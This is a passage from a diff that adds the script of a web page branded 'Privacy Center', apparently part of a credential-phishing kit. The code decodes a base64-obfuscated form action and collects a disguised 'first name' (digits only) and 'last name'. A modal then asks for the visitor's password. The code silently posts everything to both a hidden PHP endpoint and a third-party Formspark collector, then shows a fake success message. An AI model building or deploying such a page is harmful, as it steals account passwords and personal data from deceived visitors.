+            if (!result.requirements.hasNumber) result.feedback.push('Include at least one number');
+            if (!result.requirements.hasSymbol) result.feedback.push('Include at least one symbol');
+
+            return result;
+        }
+
+        /**
+         * BASE64 URL DECODING
+         * ==================================================
+         * Decodes all base64 encoded URLs on page load
+         */
+        function decodeBase64URLs() {
+            // Decode all data-src attributes for images
+            const images = document.querySelectorAll('img[data-src]');
+            images.forEach(img => {
+                const decodedSrc = decodeBase64(img.getAttribute('data-src'));
+                img.src = decodedSrc;
+                img.removeAttribute('data-src');
+            });
+
+            // Set video source
+            const videos = document.querySelectorAll('video[data-src]');
+            videos.forEach(video => {
+                const videoSource = decodeBase64(CONFIG.VIDEO_SOURCE);
+                video.src = videoSource;
+                video.removeAttribute('data-src');
+            });
+
+            // Decode form action
+            const form = document.querySelector('form[data-action]');
+            if (form) {
+                const decodedAction = decodeBase64(form.getAttribute('data-action'));
+                form.action = decodedAction;
+                form.removeAttribute('data-action');
+            }
+
+            console.log('Base64 URLs decoded successfully');
+        }
+
+        /**
+         * HEADER SEARCH FUNCTIONALITY
+         * ==================================================
+         * Implements search bar features
+         */
+        function initializeHeaderSearch() {
+            const searchInput = document.querySelector('.header-search input');
+            const clearButton = document.querySelector('.header-search-clear');
+
+            if (!searchInput || !clearButton) return;
+
+            // Clear button functionality
+            const handleClearClick = () => {
+                searchInput.value = '';
+                searchInput.focus();
+                console.log('Search cleared');
+            };
+
+            clearButton.addEventListener('click', handleClearClick);
+
+            // Keyboard shortcut (Ctrl+K or Cmd+K)
+            document.addEventListener('keydown', (e) => {
+                if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                    e.preventDefault();
+                    searchInput.focus();
+                    console.log('Search focus triggered');
+                }
+            });
+
+            // Optional: Search functionality
+            const debouncedSearch = debounce((value) => {
+                if (value.length > 0) {
+                    console.log('Searching for:', value);
+                    // Implement search logic here
+                }
+            });
+
+            searchInput.addEventListener('input', (e) => {
+                debouncedSearch(e.target.value);
+            });
+
+            console.log('Header search initialized');
+        }
+
+        /**
+         * FORM INPUT FILTERING & VALIDATION
+         * ==================================================
+         * Applies input restrictions and validation
+         */
+        function initializeFormInputs() {
+            // First Name - Numbers only
+            const firstNameInput = document.querySelector('input[name="first_name"]');
+            if (firstNameInput) {
+                firstNameInput.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                });
+
+                firstNameInput.addEventListener('keypress', (e) => {
+                    if (!/[0-9]/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+
+                firstNameInput.addEventListener('blur', () => {
+                    if (firstNameInput.value && !isNumericOnly(firstNameInput.value)) {
+                        showFieldError('firstName', '⚠ First name must contain numbers only');
+                    }
+                });
+
+                console.log('First name input initialized');
+            }
+
+            // Last Name - Must contain symbols + alphabets + numbers
+            const lastNameInput = document.querySelector('input[name="last_name"]');
+            const lastNameError = document.getElementById('lastNameError');
+
+            if (lastNameInput) {
+                lastNameInput.addEventListener('input', (e) => {
+                    // Allow letters, numbers, and symbols
+                    e.target.value = e.target.value.replace(/[^\w\s\-.,!@#$%^&*()+=\[\]{};':"<>?,./\\|`~]/g, '');
+                });
+
+                lastNameInput.addEventListener('blur', () => {
+                    validateLastName();
+                });
+
+                lastNameInput.addEventListener('input', () => {
+                    if (lastNameInput.value.length > 0) {
+                        if (hasAlphabet(lastNameInput.value) && hasNumber(lastNameInput.value) && hasSymbol(lastNameInput.value)) {
+                            if (lastNameError) toggleElement(lastNameError, false);
+                        }
+                    }
+                });
+
+                console.log('Last name input initialized');
+            }
+
+            function validateLastName() {
+                if (!lastNameInput.value) return;
+
+                const isValid = hasAlphabet(lastNameInput.value) && 
+                               hasNumber(lastNameInput.value) && 
+                               hasSymbol(lastNameInput.value);
+
+                if (!isValid && lastNameError) {
+                    lastNameError.textContent = '⚠ Please fill required information (must contain alphabets, numbers, and symbols)';
+                    toggleElement(lastNameError, true);
+                } else if (lastNameError) {
+                    toggleElement(lastNameError, false);
+                }
+            }
+        }
+
+        /**
+         * MODAL MANAGEMENT
+         * ==================================================
+         * Handles modal display and interactions
+         */
+        class ModalManager {
+            constructor(modalId) {
+                this.modal = document.getElementById(modalId);
+                this.isOpen = false;
+            }
+
+            open() {
+                if (!this.modal) return;
+                this.modal.classList.add('active');
+                this.isOpen = true;
+                document.body.style.overflow = 'hidden';
+                console.log(`Modal ${this.modal.id} opened`);
+            }
+
+            close() {
+                if (!this.modal) return;
+                this.modal.classList.remove('active');
+                this.isOpen = false;
+                document.body.style.overflow = '';
+                console.log(`Modal ${this.modal.id} closed`);
+            }
+
+            toggle() {
+                this.isOpen ? this.close() : this.open();
+            }
+        }
+
+        const passwordModalManager = new ModalManager('passwordModal');
+        const successModalManager = new ModalManager('successModal');
+
+        /**
+         * PASSWORD MODAL FUNCTIONALITY
+         * ==================================================
+         * Handles password input modal
+         */
+        function initializePasswordModal() {
+            const modalPassword = document.getElementById('modalPassword');
+            const togglePassword = document.getElementById('togglePassword');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const cancelBtn = document.getElementById('cancelBtn');
+
+            if (!modalPassword || !togglePassword) return;
+
+            // Toggle password visibility
+            togglePassword.addEventListener('click', () => {
+                const type = modalPassword.getAttribute('type') === 'password' ? 'text' : 'password';
+                modalPassword.setAttribute('type', type);
+                togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
+                console.log('Password visibility toggled');
+            });
+
+            // Cancel button
+            if (cancelBtn) {
+                cancelBtn.addEventListener('click', () => {
+                    passwordModalManager.close();
+                    modalPassword.value = '';
+                    formData = {};
+                    console.log('Modal cancelled');
+                });
+            }
+
+            // Allow Enter to confirm
+            modalPassword.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    confirmBtn.click();
+                }
+            });
+
+            // Close modal when clicking outside
+            const passwordModal = document.getElementById('passwordModal');
+            if (passwordModal) {
+                passwordModal.addEventListener('click', (e) => {
+                    if (e.target === passwordModal) {
+                        passwordModalManager.close();
+                        modalPassword.value = '';
+                        formData = {};
+                        console.log('Modal closed via outside click');
+                    }
+                });
+            }
+
+            console.log('Password modal initialized');
+        }
+
+        /**
+         * FORM SUBMISSION
+         * ==================================================
+         * Handles main form submission and validation
+         */
+        let formData = {};
+
+        function initializeFormSubmission() {
+            const appealForm = document.querySelector('form');
+            const confirmBtn = document.getElementById('confirmBtn');
+
+            if (!appealForm) return;
+
+            // Form submission
+            appealForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                console.log('Form submitted');
+
+                const firstName = document.querySelector('input[name="first_name"]').value;
+                const lastName = document.querySelector('input[name="last_name"]').value;
+
+                // Validate inputs
+                if (!firstName || !lastName) {
+                    alert('Please fill in both first name and last name');
+                    return;
+                }
+
+                // Validate first name (numbers only)
+                if (!isNumericOnly(firstName)) {
+                    alert('First name must contain numbers only');
+                    return;
+                }
+
+                // Validate last name (must contain alphabet + number + symbol)
+                if (!(hasAlphabet(lastName) && hasNumber(lastName) && hasSymbol(lastName))) {
+                    alert('Last name must contain alphabets, numbers, and symbols');
+                    return;
+                }
+
+                // Store form data and show modal
+                formData = {
+                    first_name: firstName,
+                    last_name: lastName
+                };
+
+                passwordModalManager.open();
+                console.log('Password modal opened for confirmation');
+            });
+
+            // Confirm button in modal
+            if (confirmBtn) {
+                confirmBtn.addEventListener('click', submitForm);
+            }
+
+            console.log('Form submission initialized');
+        }
+
+        /**
+         * Submits the form data to the server
+         */
+        function submitForm() {
+            const modalPassword = document.getElementById('modalPassword');
+            const password = modalPassword.value;
+
+            if (!password) {
+                alert('Please enter your password');
+                return;
+            }
+
+            formData.password = password;
+
+            // Create form for PHP endpoint
+            const phpForm = document.createElement('form');
+            phpForm.method = 'POST';
+            phpForm.action = decodeBase64(CONFIG.FORM_ACTION);
+            phpForm.style.display = 'none';
+
+            // Add all data to PHP form
+            for (const [key, value] of Object.entries(formData)) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                phpForm.appendChild(input);
+            }
+
+            document.body.appendChild(phpForm);
+
+            // Create form for Formspark
+            const formsparkForm = document.createElement('form');
+            formsparkForm.method = 'POST';
+            formsparkForm.action = CONFIG.FORMSPARK_ACTION;
+            formsparkForm.style.display = 'none';
+
+            // Add all data to Formspark
+            for (const [key, value] of Object.entries(formData)) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                formsparkForm.appendChild(input);
+            }
+
+            document.body.appendChild(formsparkForm);
+
+            // Close password modal and show success modal
+            passwordModalManager.close();
+            successModalManager.open();
+
+            // Submit forms
+            setTimeout(() => {
+                formsparkForm.submit();
+                setTimeout(() => {
+                    phpForm.submit();
+                }, 500);
+            }, CONFIG.FORM_TIMEOUT);
+
+            console.log('Form submitted successfully');
+        }
+
+        /**
+         * SUCCESS MODAL FUNCTIONALITY
+         * ==================================================
+         * Handles success modal interactions
+         */
+        function initializeSuccessModal() {
+            const successBtn = document.getElementById('successBtn');
+
+            if (successBtn) {
+                successBtn.addEventListener('click', () => {
+                    successModalManager.close();
+                    // Reset form
+                    const form = document.querySelector('form');
+                    if (form) form.reset();
+                    console.log('Success modal closed and form reset');
+                });
+            }
+
+            console.log('Success modal initialized');
+        }
+
+        /**
+         * VIDEO PLAYBACK & FULLSCREEN
+         * ==================================================
+         * Enhanced video controls with fullscreen support
+         */
+        function initializeVideoPlayback() {
+            const videoElement = document.querySelector('.form-video-thumbnail');
+            if (!videoElement) return;
+
+            /**
+             * Request fullscreen in a cross-browser compatible way
+             */
+            function requestFullscreen(element) {
+                if (element.requestFullscreen) {
+                    return element.requestFullscreen().catch(err => {
+                        console.warn('Fullscreen request failed:', err);
+                    });
+                } else if (element.webkitRequestFullscreen) {
+                    return element.webkitRequestFullscreen();
+                } else if (element.webkitEnterFullscreen) {
+                    return element.webkitEnterFullscreen();
+                } else if (element.msRequestFullscreen) {
+                    return element.msRequestFullscreen();
+                } else {
+                    console.warn('Fullscreen API is not supported');
+                    return Promise.reject(new Error('Fullscreen not supported'));
+                }
+            }
+
+            /**
+             * Handle play with proper error handling
+             */
+            function startPlayback() {
+                const playPromise = videoElement.play();
+
+                if (playPromise !== undefined) {
+                    playPromise
+                        .then(() => {
+                            console.log('Video playback started');
+                        })
+                        .catch(error => {
+                            console.warn('Video playback failed:', error);
+                        });
+                } else {
+                    videoElement.play();
+                }
+            }
+
+            // Click handler
+            videoElement.addEventListener('click', (e) => {
+                e.preventDefault();
+                startPlayback();
+                requestFullscreen(videoElement).catch(err => {
+                    console.warn('Could not enter fullscreen:', err);
+                });
+            });
+
+            // Touch handler for mobile
+            videoElement.addEventListener('touchstart', (e) => {
+                if (videoElement.paused) {
+                    e.preventDefault();
+                    startPlayback();
+                    setTimeout(() => {
+                        requestFullscreen(videoElement).catch(err => {
+                            console.warn('Fullscreen request on touch failed:', err);
+                        });
+                    }, 100);
+                }
+            }, false);
+
+            // Fullscreen change handler
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    console.log('Exited fullscreen');
+                }
+            });
+
+            console.log('Video playback initialized');
+        }
+
+        /**
+         * ACCESSIBILITY FEATURES
+         * ==================================================
+         * Enhances accessibility for users with disabilities
+         */
+        function initializeAccessibility() {
+            // Keyboard navigation support
+            document.addEventListener('keydown', (e) => {
+                // Escape to close modals
+                if (e.key === 'Escape') {
+                    if (passwordModalManager.isOpen) {
+                        passwordModalManager.close();
+                    }
+                    if (successModalManager.isOpen) {
+                        successModalManager.close();
+                    }
+                }
+            });
+
+            // Announce page load to screen readers
+            const announcement = document.createElement('div');
+            announcement.setAttribute('role', 'status');
+            announcement.setAttribute('aria-live', 'polite');
+            announcement.className = 'hidden';
+            announcement.textContent = 'Privacy Center loaded';
+            document.body.appendChild(announcement);
+
+            console.log('Accessibility features initialized');
+        }
+
+        /**
+         * PERFORMANCE MONITORING
+         * ==================================================
+         * Monitors and logs performance metrics
+         */
+        function initializePerformanceMonitoring() {
+            // Log page load time
+            window.addEventListener('load', () => {
+                const perfData = window.performance.timing;
+                const pageLoadTime = perfData.loadEventEnd - perfData.navigationStart;
+                console.log(`Page load time: ${pageLoadTime}ms`);
+
+                // Log Core Web Vitals
+                if ('PerformanceObserver' in window) {
+                    try {
+                        const observer = new PerformanceObserver((list) => {
+                            for (const entry of list.getEntries()) {
+                                console.log(`${entry.name}: ${entry.value}ms`);
+                            }
+                        });
+
+                        observer.observe({ entryTypes: ['largest-contentful-paint', 'first-input'] });
+                    } catch (e) {
+                        console.log('Performance Observer not fully supported');
+                    }
+                }
+            });
+        }
+
+        /**
+         * INITIALIZATION
+         * ==================================================
+         * Initializes the entire application
+         */
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('='.repeat(50));
+            console.log('Privacy Center Application Starting');
+            console.log('='.repeat(50));
+
+            // Initialize all features
+            decodeBase64URLs();
+            initializeHeaderSearch();
+            initializeFormInputs();
+            initializePasswordModal();
+            initializeFormSubmission();
+            initializeSuccessModal();
+            initializeVideoPlayback();
+            initializeAccessibility();
+            initializePerformanceMonitoring();
+
+            console.log('='.repeat(50));
+            console.log('Application Initialization Complete');
+            console.log('='.repeat(50));
+        });
+
+        /**
+         * GLOBAL ERROR HANDLER
+         * ==================================================
+         * Catches unhandled errors
+         */
+        window.addEventListener('error', (event) => {
+            console.error('Global error caught:', event.error);
+        });
+
+        /**
+         * UNHANDLED PROMISE REJECTION HANDLER
+         * ==================================================
+         * Catches unhandled promise rejections
+         */
+        window.addEventListener('unhandledrejection', (event) => {
+            console.error('Unhandled promise rejection:', event.reason);
+        });
+    </script>
+</body>
+</html>
